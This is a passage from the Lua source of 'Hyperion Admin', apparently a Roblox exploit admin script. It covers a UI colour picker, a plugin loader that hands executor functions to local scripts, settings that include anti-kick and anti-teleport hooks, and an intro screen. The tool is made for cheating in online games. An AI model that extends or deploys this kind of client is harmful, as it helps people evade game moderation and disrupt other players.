							S = XValue
							V = 1 - YValue

							CurrentColor = Color3fromHSV(H, S, V);
							ColorPreview.BackgroundColor3 = CurrentColor
							UpdateText()

							local Position = UDim2New(XValue, 2, YValue, 2);
							local Tween = Utils.Tween(CanvasBar, "Linear", "Out", .05, {
								Position = Position
							});
							Callback(CurrentColor);
							CWait(Tween.Completed);
						end
					end

					AddConnection(CConnect(CanvasHitbox.MouseButton1Down, function()
						Moving = true
						Update()
					end))

					AddConnection(CConnect(UserInputService.InputEnded, function(Input)
						if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
							Moving = false
						end
					end))

					AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
						if Moving then
							Update()
						end
					end)))
				end

				ColorSliderInit()
				ColorCanvasInit()

				AddConnection(CConnect(Button.MouseButton1Click, function()
					if not Opened then
						Opened = true
						UpdateColor()
						RainbowToggle.Container.Switch.Position = Rainbow and UDim2New(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
						RainbowToggle.Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
						Overlay.Visible = true
						OverlayMain.Visible = false
						Utils.Intro(OverlayMain)
					end
				end))

				AddConnection(CConnect(ClosePicker.MouseButton1Click, Utils.Debounce(function()
					Button.BackgroundColor3 = CurrentColor
					Utils.Intro(OverlayMain)
					Overlay.Visible = false
					Opened = false
				end)))

				AddConnection(CConnect(RedTextBox.FocusLost, function()
					if Opened then
						local Number = tonumber(RedTextBox.Text)
						if Number then
							Number = clamp(floor(Number), 0, 255)
							CurrentColor = Color3New(Number / 255, CurrentColor.G, CurrentColor.B)
							UpdateColor()
							RedTextBox.PlaceholderText = tostring(Number)
							Callback(CurrentColor)
						end
						RedTextBox.Text = ""
					end
				end))

				AddConnection(CConnect(GreenTextBox.FocusLost, function()
					if Opened then
						local Number = tonumber(GreenTextBox.Text)
						if Number then
							Number = clamp(floor(Number), 0, 255)
							CurrentColor = Color3New(CurrentColor.R, Number / 255, CurrentColor.B)
							UpdateColor()
							GreenTextBox.PlaceholderText = tostring(Number)
							Callback(CurrentColor)
						end
						GreenTextBox.Text = ""
					end
				end))

				AddConnection(CConnect(BlueTextBox.FocusLost, function()
					if Opened then
						local Number = tonumber(BlueTextBox.Text)
						if Number then
							Number = clamp(floor(Number), 0, 255)
							CurrentColor = Color3New(CurrentColor.R, CurrentColor.G, Number / 255)
							UpdateColor()
							BlueTextBox.PlaceholderText = tostring(Number)
							Callback(CurrentColor)
						end
						BlueTextBox.Text = ""
					end
				end))

				Utils.ToggleFunction(RainbowToggle.Container, false, function(Callback)
					if Opened then
						Rainbow = Callback
					end
				end)

				AddConnection(CConnect(RenderStepped, function()
					if Rainbow then
						local Hue = (tick() / 5) % 1
						CurrentColor = Color3.fromHSV(Hue, S, V)

						if Opened then
							UpdateHue(Hue)
						end

						Button.BackgroundColor3 = CurrentColor
						Callback(CurrentColor, true);
					end
				end))

				Button.BackgroundColor3 = DefaultColor
				SelectColor.Title.Text = Title
				SelectColor.Visible = true
				SelectColor.Parent = Section.Options
				Utils.Thing(SelectColor.Title);
			end

			return ElementLibrary
		end

		return PageLibrary
	end
end

Utils.Click(ConfigUI.Close, "TextColor3")
AddConnection(CConnect(ConfigUI.Close.MouseButton1Click, function()
	ConfigLoaded = false
	CWait(Utils.TweenAllTrans(ConfigUI, .25).Completed);
	ConfigUI.Visible = false
end))
--END IMPORT [uimore]


--IMPORT [plugin]
PluginConf = IsSupportedExploit and GetPluginConfig();
local Plugins;

PluginLibrary = {
	LocalPlayer = LocalPlayer,
	Services = Services,
	GetCharacter = GetCharacter,
	ProtectInstance = ProtectInstance,
	SpoofInstance = SpoofInstance,
	SpoofProperty = SpoofProperty,
	UnSpoofInstance = UnSpoofInstance,
	ReplaceCharacter = ReplaceCharacter,
	ReplaceHumanoid = ReplaceHumanoid,
	GetCorrectToolWithHandle = GetCorrectToolWithHandle,
	DisableAnimate = DisableAnimate,
	GetPlayer = GetPlayer,
	GetHumanoid = GetHumanoid,
	GetRoot = GetRoot,
	GetMagnitude = GetMagnitude,
	GetCommandEnv = function(Name)
		local Command = LoadCommand(Name);
		if (Command.CmdEnv) then
			return Command.CmdEnv
		end
	end,
	isR6 = isR6,
	ExecuteCommand = ExecuteCommand,
	Notify = Utils.Notify,
	HasTool = HasTool,
	isSat = isSat,
	Request = syn and syn.request or request or game.HttpGet,
	CThread = CThread,
	AddConnection = AddConnection,
	filter = filter,
	map = map,
	clone = clone,
	firetouchinterest = firetouchinterest,
	fireproximityprompt = fireproximityprompt,
	decompile = decompile,
	getnilinstances = getnilinstances,
	getinstances = getinstances,
	Drawing = Drawing
}

do
	local IsDebug = IsSupportedExploit and PluginConf.PluginDebug

	Plugins = IsSupportedExploit and map(filter(listfiles("Hyperion-admin/plugins"), function(i, v)
		return lower(split(v, ".")[#split(v, ".")]) == "lua"
	end), function(i, v)
		local splitted = split(v, "\\");
		return {splitted[#splitted], loadfile(v)}
	end) or {}

	if (SafePlugins) then
		local Renv = clone(getrenv(), true);
		for i, v in next, Renv do
			PluginLibrary[i] = v
		end
	end
	PluginLibrary.debug = nil
	PluginLibrary.getfenv = nil
	PluginLibrary.loadstring = loadstring

	if (PluginConf.SafePlugins) then
		local Funcs = {}
		for i, v in next, PluginLibrary do
			if (type(v) == 'function') then
				Funcs[#Funcs + 1] = v
			end
		end
		local FateEnv = getfenv(1);
		PluginLibrary.getfenv = newcclosure(function(...)
			local f = ({...})[1]
			local Env = getfenv(...);
			if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
				return PluginLibrary
			end
			return Env
		end)
	end

	if (PluginConf.PluginsEnabled) then
		local LoadPlugin = function(Plugin)
			if (not IsSupportedExploit) then
				return 
			end

			if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
				Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
				return "Disabled"
			end
			if (#keys(Plugin) < 3) then
				return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
			end
			if (IsDebug) then
				Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
			end

			local Context;
			local sett, gett = setthreadidentity, getthreadidentity
			if (sett and PluginConf.SafePlugins) then
				Context = gett();
				sett(5);
			end
			local Ran, Return = pcall(Plugin.Init);
			if (sett and Context) then
				sett(Context);
			end
			if (not Ran and Return and IsDebug) then
				return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
			end

			for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
				if (#keys(command) < 3) then
					Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
					continue
				end
				AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);

				if (FindFirstChild(Commands.Frame.List, command.Name)) then
					Destroy(FindFirstChild(Commands.Frame.List, command.Name));
				end
				local Clone = Clone(Command);
				Utils.Hover(Clone, "BackgroundColor3");
				Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
				Clone.CommandText.RichText = true
				Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
				Clone.Name = command.Name
				Clone.Visible = true
				Clone.Parent = Commands.Frame.List
				if (IsDebug) then
					Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
				end
			end
		end

		if (IsSupportedExploit) then
			if (not isfolder("Hyperion-admin") and not isfolder("Hyperion-admin/plugins") and not isfolder("Hyperion-admin/plugin-conf.json") or not isfolder("Hyperion-admin/chatlogs")) then
				WriteConfig();
			end
		end

		for i, Plugin in next, Plugins do
			local PluginFunc = Plugin[2]
			if (PluginConf.SafePlugins) then
				setfenv(PluginFunc, PluginLibrary);
			else
				local CurrentEnv = getfenv(PluginFunc);
				for i2, v2 in next, PluginLibrary do
					CurrentEnv[i2] = v2
				end
			end
			local Success, Ret = pcall(PluginFunc);
			if (Success) then
				LoadPlugin(Ret);
			elseif (PluginConf.PluginDebug) then
				Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
				warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
			end
		end

		AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
			if (not IsSupportedExploit) then
				return "your exploit does not support plugins"
			end
			PluginConf = GetPluginConfig();
			IsDebug = PluginConf.PluginDebug

			Plugins = map(filter(listfiles("Hyperion-admin/plugins"), function(i, v)
				return lower(split(v, ".")[#split(v, ".")]) == "lua"
			end), function(i, v)
				return {split(v, "\\")[2], loadfile(v)}
			end)

			for i, Plugin in next, Plugins do
				local PluginFunc = Plugin[2]
				setfenv(PluginFunc, PluginLibrary);
				local Success, Ret = pcall(PluginFunc);
				if (Success) then
					LoadPlugin(Ret);
				elseif (PluginConf.PluginDebug) then
					Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
					warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
				end
			end
		end)
	end
end
--END IMPORT [plugin]


WideBar = false
Draggable = false

--IMPORT [config]
do
	local UserInputService = Services.UserInputService
	local GetStringForKeyCode = UserInputService.GetStringForKeyCode
	local function GetKeyName(KeyCode)
		local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
		local IsEnum = Stringed == ""
		return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
	end

	local SortKeys = function(Key1, Key2)
		local KeyName, IsEnum = GetKeyName(Key1);
		if (Key2) then
			local KeyName2, IsEnum2 = GetKeyName(Key2);
			return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
		end
		return KeyName
	end

	LoadConfig = function()
		local Script = ConfigUILib.NewPage("Script");
		local Settings = Script.NewSection("Settings");

		local CurrentConf = GetConfig();

		Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
			if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
				Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
				return
			end
			Prefix = Key
			Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
		end)

		Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
			CommandBarPrefix = KeyCode1
			Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
		end)

		local ToggleSave;
		ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
			SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
			wait(.5);
			ToggleSave();
			Utils.Notify(nil, "Prefix", "saved prefix's");
		end)

		local Misc = Script.NewSection("Misc");

		Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
			local ChatBar = ToggleChatPrediction();
			if (Callback) then
				ChatBar.CaptureFocus(ChatBar);
				wait();
				ChatBar.Text = Prefix
			end
			SetConfig({ChatPrediction=Callback});
			Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
		end)

		Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
			Hooks.AntiKick = Callback
			Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
		end)

		Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
			Hooks.AntiTeleport = Callback
			Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
		end)

		Misc.Toggle("wide cmdbar", WideBar, function(Callback)
			WideBar = Callback
			if (not Draggable) then
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
				})
			end
			Utils.Tween(CommandBar, "Quint", "Out", .5, {
				Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
			})
			SetConfig({WideBar=Callback});
			Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
		end)

		Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
			Draggable = Callback
			CommandBarOpen = true
			Utils.Tween(CommandBar, "Quint", "Out", .5, {
				Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
			})
			Utils.Draggable(CommandBar);
			local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
			local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
			CommandBar.Input.Text = ""
			if (not Callback) then
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
				})
			end
			Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
		end)

		Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
			SetConfig({KillCam=Callback});
			_L.KillCam = Callback
		end)

		local OldFireTouchInterest = firetouchinterest
		Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
			firetouchinterest = Callback and function(part1, part2, toggle)
				if (part1 and part2) then
					if (toggle == 0) then
						touched[1] = part1.CFrame
						part1.CFrame = part2.CFrame
					else
						part1.CFrame = touched[1]
						touched[1] = nil
					end
				end
			end or OldFireTouchInterest
		end)

		local MacrosPage = ConfigUILib.NewPage("Macros");
		local MacroSection;
		MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
			local AlreadyAdded = false
			for i = 1, #Macros do
				if (Macros[i].Command == Command) then
					AlreadyAdded = true
				end
			end
			if (CommandsTable[Command] and not AlreadyAdded) then
				MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
				Args = split(Args, " ");
				if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
					local Shifted = {Command, unpack(Args)}
					Macros[#Macros + 1] = {
						Command = "toggle",
						Args = Shifted,
						Keys = Bind
					}
				else
					Macros[#Macros + 1] = {
						Command = Command,
						Args = Args,
						Keys = Bind
					}
				end
				local TempMacros = clone(Macros);
				for i, v in next, TempMacros do
					for i2, v2 in next, v.Keys do
						TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
					end
				end
				SetConfig({Macros=TempMacros});
			end
		end)
		local UIListLayout = MacroSection.CommandsList.UIListLayout
		for i, v in next, CommandsTable do
			if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
				MacroSection.AddCmd(v.Name);
			end
		end
		MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
		local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");

		AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
			local Text = Search.Text
			for _, v in next, GetChildren(MacroSection.CommandsList) do
				if (IsA(v, "TextButton")) then
					local Command = v.Text
					v.Visible = Sfind(lower(Command), Text, 1, true)
				end
			end
			MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
		end), Connections.UI, true);

		local PluginsPage = ConfigUILib.NewPage("Plugins");

		local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
		local PluginSettings = PluginsPage.NewSection("Plugin Settings");

		local CurrentPluginConf = GetPluginConfig();

		CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
			CurrentPluginConf = GetPluginConfig();
			for i = 1, #Plugins do
				local Plugin = Plugins[i]
				if (Plugin[1] == Option) then
					local DisabledPlugins = CurrentPluginConf.DisabledPlugins
					local PluginName = Plugin[2]().Name
					if (Enabled) then
						DisabledPlugins[PluginName] = nil
						SetPluginConfig({DisabledPlugins=DisabledPlugins});
						Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
					else
						DisabledPlugins[PluginName] = true
						SetPluginConfig({DisabledPlugins=DisabledPlugins});
						Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
					end
				end
			end
		end, map(Plugins, function(Key, Plugin)
			return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
		end));

		PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
			SetPluginConfig({PluginsEnabled = Callback});
		end)

		PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
			SetPluginConfig({PluginDebug = Callback});
		end)

		PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
			SetPluginConfig({SafePlugins = Callback});
		end)

		local Themes = ConfigUILib.NewPage("Themes");

		local Color = Themes.NewSection("Colors");
		local Options = Themes.NewSection("Options");

		local RainbowEnabled = false
		Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
			UITheme.Background.BackgroundColor = Callback
			RainbowEnabled = IsRainbow
		end)
		Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
			if (not RainbowEnabled) then
				UITheme.CommandBar.BackgroundColor = Callback
			end
		end)
		Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
			if (not RainbowEnabled) then
				UITheme.Notification.BackgroundColor = Callback
			end
		end)
		Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
			if (not RainbowEnabled) then
				UITheme.ChatLogs.BackgroundColor = Callback
			end
		end)
		Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
			if (not RainbowEnabled) then
				UITheme.CommandList.BackgroundColor = Callback
			end
		end)
		Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
			if (not RainbowEnabled) then
				UITheme.Config.BackgroundColor = Callback
			end
		end)

		Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
			UITheme.Background.TextColor = Callback
		end)

		local ToggleSave;
		ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
			WriteThemeConfig();
			wait(.5);
			ToggleSave();
			Utils.Notify(nil, "Theme", "saved theme");
		end)

		local ToggleLoad;
		ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
			LoadTheme(GetThemeConfig());
			wait(.5);
			ToggleLoad();
			Utils.Notify(nil, "Theme", "Loaded theme");
		end)

		local ToggleReset;
		ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
			UITheme.Background.BackgroundColor = "Reset"
			UITheme.Notification.TextColor = "Reset"
			UITheme.CommandBar.TextColor = "Reset"
			UITheme.CommandList.TextColor = "Reset"
			UITheme.ChatLogs.TextColor = "Reset"
			UITheme.Config.TextColor = "Reset"
			UITheme.Notification.Transparency = "Reset"
			UITheme.CommandBar.Transparency = "Reset"
			UITheme.CommandList.Transparency = "Reset"
			UITheme.ChatLogs.Transparency = "Reset"
			UITheme.Config.Transparency = "Reset"
			wait(.5);
			ToggleReset();
			Utils.Notify(nil, "Theme", "reset theme");
		end)

	end

	delay(1, function()
		for i = 1, #Macros do
			local Macro = Macros[i]
			for i2 = 1, #Macro.Keys do
				Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
			end
		end
		if (CurrentConfig.WideBar) then
			WideBar = true
			Utils.Tween(CommandBar, "Quint", "Out", .5, {
				Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
			})
		end
		KillCam = CurrentConfig.KillCam
		local Aliases = CurrentConfig.Aliases
		if (Aliases) then
			for i, v in next, Aliases do
				if (CommandsTable[i]) then
					for i2 = 1, #v do
						local Alias = v[i2]
						local Add = CommandsTable[i]
						Add.Name = Alias
						CommandsTable[Alias] = Add
					end
				end
			end
		end
	end)
end
--END IMPORT [config]


AddConnection(CConnect(CommandBar.Input.FocusLost, function()
	local Text = trim(CommandBar.Input.Text);
	local CommandArgs = split(Text, " ");

	CommandBarOpen = false

	if (not Draggable) then
		Utils.TweenAllTrans(CommandBar, .5)
		Utils.Tween(CommandBar, "Quint", "Out", .5, {
			Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5); -- tween 5
		})
	end

	local Command = CommandArgs[1]
	local Args = shift(CommandArgs);

	if (Command ~= "") then
		ExecuteCommand(Command, Args, LocalPlayer);
	end
end), Connections.UI, true);

local PlayerAdded = function(plr)
	RespawnTimes[plr.Name] = tick();
	AddConnection(CConnect(plr.CharacterAdded, function()
		RespawnTimes[plr.Name] = tick();
	end));
end

forEach(GetPlayers(Players), function(i,v)
	PlayerAdded(v);
end);

AddConnection(CConnect(Players.PlayerAdded, function(plr)
	PlayerAdded(plr);
end))

AddConnection(CConnect(Players.PlayerRemoving, function(plr)
	if (Connections.Players[plr.Name]) then
		if (Connections.Players[plr.Name].ChatCon) then
			Disconnect(Connections.Players[plr.Name].ChatCon);
		end
		Connections.Players[plr.Name] = nil
	end
	if (RespawnTimes[plr.Name]) then
		RespawnTimes[plr.Name] = nil
	end
end))

getgenv().F_A = {
	Utils = Utils,
	PluginLibrary = PluginLibrary,
	GetConfig = GetConfig
}

local HyperionScreenGui = Instance.new("ScreenGui")
local Intro = Instance.new("Folder")
local TitleLabelIntro = Instance.new("TextLabel")
local VersionLabelIntroClipDescendants = Instance.new("TextLabel")
local VersionLabelIntro = Instance.new("TextLabel")
local IntroBlurEffect = Instance.new("BlurEffect")
local Id = 6958727243
local Startup = Instance.new("Sound", game.Workspace)
Startup.Looped = false
Startup.Volume = 5
Startup.TimePosition = 1
Startup.SoundId = "rbxassetid://"..tostring(Id)

local Settings = {

	Player = game:GetService("Players").LocalPlayer.Name, 
}

HyperionScreenGui.Name = "HyperionScreenGui"
HyperionScreenGui.Parent = game:GetService("CoreGui")
HyperionScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Intro.Name = "Intro"
Intro.Parent = HyperionScreenGui

TitleLabelIntro.Name = "TitleLabelIntro"
TitleLabelIntro.Parent = Intro
TitleLabelIntro.AnchorPoint = Vector2.new(0.5, 1)
TitleLabelIntro.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleLabelIntro.BackgroundTransparency = 1.000
TitleLabelIntro.Position = UDim2.new(0.5, 0, 0.5, 0)
TitleLabelIntro.Size = UDim2.new(0.300000012, 0, 0.100000001, 0)
TitleLabelIntro.Font = Enum.Font.SourceSansBold
TitleLabelIntro.Text = "< Hyperion Admin >"
TitleLabelIntro.TextColor3 = Color3.fromRGB(252,252,252)
TitleLabelIntro.TextSize = 45.000
TitleLabelIntro.TextTransparency = 1.000

VersionLabelIntroClipDescendants.Name = "VersionLabelIntroClipDescendants"
VersionLabelIntroClipDescendants.Parent = Intro
VersionLabelIntroClipDescendants.AnchorPoint = Vector2.new(0.5, 0)
VersionLabelIntroClipDescendants.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VersionLabelIntroClipDescendants.BackgroundTransparency = 1.000
VersionLabelIntroClipDescendants.ClipsDescendants = true
VersionLabelIntroClipDescendants.Position = UDim2.new(0.5, 0, 0.5, 0)
VersionLabelIntroClipDescendants.Size = UDim2.new(0.300000012, 0, 0.100000001, 0)
VersionLabelIntroClipDescendants.Font = Enum.Font.GothamSemibold
VersionLabelIntroClipDescendants.Text = ""
VersionLabelIntroClipDescendants.TextColor3 = Color3.fromRGB(205, 255, 233)
VersionLabelIntroClipDescendants.TextSize = 30.000
VersionLabelIntroClipDescendants.TextStrokeTransparency = 0.900
VersionLabelIntroClipDescendants.TextWrapped = true

VersionLabelIntro.Name = "VersionLabelIntro"
VersionLabelIntro.Parent = VersionLabelIntroClipDescendants
VersionLabelIntro.AnchorPoint = Vector2.new(0.5, 1)
VersionLabelIntro.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VersionLabelIntro.BackgroundTransparency = 1.000
VersionLabelIntro.Position = UDim2.new(0.5, 0, 0, 0)
VersionLabelIntro.Size = UDim2.new(1, 0, 1, 0)
VersionLabelIntro.Font = Enum.Font.GothamSemibold
VersionLabelIntro.Text = "V3.0.0"
VersionLabelIntro.TextColor3 = Color3.fromRGB(252,252,252)
VersionLabelIntro.TextSize = 30.000
VersionLabelIntro.TextTransparency = 0
VersionLabelIntro.TextStrokeTransparency = 0.9
VersionLabelIntro.TextWrapped = true

IntroBlurEffect.Name = "IntroBlurEffect"
IntroBlurEffect.Parent = game:GetService("Lighting")
IntroBlurEffect.Enabled = true
IntroBlurEffect.Size = 0 -- 10



--/ Scripting: Intro

game:GetService("TweenService"):Create(IntroBlurEffect, TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Size = 5}):Play()
Startup:Play()
wait(0.35)

game:GetService("TweenService"):Create(TitleLabelIntro, TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0, TextStrokeTransparency = 0.9}):Play()
wait(0.3)
VersionLabelIntro.Text = "Welcome " .. Settings.Player
game:GetService("TweenService"):Create(VersionLabelIntro, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.8, 0)}):Play()
wait(1.5)

game:GetService("TweenService"):Create(TitleLabelIntro, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
wait(0.25 / 4 * 2.75)
Startup:Destroy()
game:GetService("TweenService"):Create(VersionLabelIntro, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
game:GetService("TweenService"):Create(IntroBlurEffect, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = 0}):Play()
wait(0.3)

--/ Scripting: Intro

Utils.Notify(LocalPlayer, "Welcome!", format("Hyperion Admin has loaded in %.3f seconds.", (tick()) - _L.start));
if Services.SoundService.RespectFilteringEnabled == false then 
	Utils.Notify(LocalPlayer, "RespectFilteringEnabled", "Filtering is DISABLED, audio commands will replicate.");
else
	Utils.Notify(LocalPlayer, "RespectFilteringEnabled", "Filtering is ENABLED, audio commands will NOT replicate.");    
end

--/END\--
